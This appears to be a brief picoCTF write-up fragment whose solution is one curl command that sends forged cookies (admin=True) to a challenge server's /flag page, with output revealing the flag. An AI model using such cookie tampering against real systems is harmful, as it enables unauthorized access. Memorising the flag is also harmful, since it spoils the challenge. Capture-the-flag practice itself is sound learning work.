### Solucion
```
Ale5623-picoctf@webshell:~$ curl http://fickle-tempest.picoctf.net:54622/flag -H "Cookie: password=Alex; username=Alex; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0  27084      0 --:--:-- --:--:-- --:--:-- 27333
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>
Ale5623-picoctf@webshell:~$ 
```